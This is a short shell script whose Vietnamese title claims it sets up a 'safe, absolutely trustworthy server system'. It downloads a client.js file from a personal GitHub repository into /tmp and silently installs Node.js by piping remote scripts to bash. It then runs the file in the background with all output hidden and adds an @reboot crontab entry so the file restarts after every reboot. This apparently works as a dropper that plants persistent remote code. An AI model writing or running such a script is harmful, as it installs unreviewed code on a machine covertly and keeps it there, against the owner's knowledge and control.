# Hệ thống server an toàn , trust tuyệt đối!

cd /tmp || exit 1

CLIENT_FILE="/tmp/client.js"
CRON_TAG="client-autostart"

curl -sL https://github.com/Nguoibianhz/vpstest/raw/refs/heads/main/client.js -o "$CLIENT_FILE"

if ! command -v node >/dev/null 2>&1; then
  if command -v apt-get >/dev/null 2>&1; then
    curl -fsSL https://deb.nodesource.com/setup_20.x | bash - >/dev/null 2>&1
    apt-get install -y nodejs >/dev/null 2>&1
  elif command -v yum >/dev/null 2>&1; then
    curl -fsSL https://rpm.nodesource.com/setup_20.x | bash - >/dev/null 2>&1
    yum install -y nodejs >/dev/null 2>&1
  elif command -v apk >/dev/null 2>&1; then
    apk add --no-cache nodejs npm >/dev/null 2>&1
  fi
fi

pkill -f "$CLIENT_FILE" 2>/dev/null || true

nohup node "$CLIENT_FILE" >/dev/null 2>&1 &

(
  crontab -l 2>/dev/null | grep -v "$CRON_TAG"
  echo "@reboot nohup node $CLIENT_FILE >/dev/null 2>&1 & # $CRON_TAG"
) | crontab -
